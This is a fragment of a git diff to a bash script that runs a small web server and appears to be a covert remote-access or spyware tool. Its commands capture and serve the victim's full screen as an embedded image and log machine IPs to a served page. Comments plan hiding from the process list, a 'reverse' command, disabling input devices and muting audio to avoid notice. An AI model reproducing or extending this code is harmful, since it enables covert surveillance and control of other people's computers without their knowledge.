@@ -1,7 +1,11 @@
 #!/bin/bash
 # pass in document root as first arg
-# web.sh ~/Sites/test
+#./xinput       then access serverpage at http://localhost:9000/servers  or whatever the ip is
+
 #credits https://paulbuchheit.blogspot.ca/2007/04/webserver-in-bash.html
+
+
+#Linux Version
 
 #todo periodic running to hide from process list
 DOC_ROOT=./tmp #$1
@@ -50,6 +54,7 @@ if [ $command ]; then
            #libnotify
    # fi
    # if [ $command == lockscreen ];then
+        #disable input devices
    # fi
     if [ $command == reverse ];then
         #todo perodic 
@@ -62,6 +67,7 @@ if [ $command ]; then
         echo $(echo $MYIP;echo "<br>") >> $DOC_ROOT/servers   
     fi
     if [ $command == screen ];then
+        #makes noise on some systems maybe set pulse audio volume to 0 for this
         import -window root $DOC_ROOT/screen.png
         convert $DOC_ROOT/screen.png -resize 50% $DOC_ROOT/screen.png
         echo $(cat server;echo '<img alt="Embedded Image" src="data:image/png;base64,'; base64 $DOC_ROOT/screen.png;echo '" />' ) > $DOC_ROOT/servers
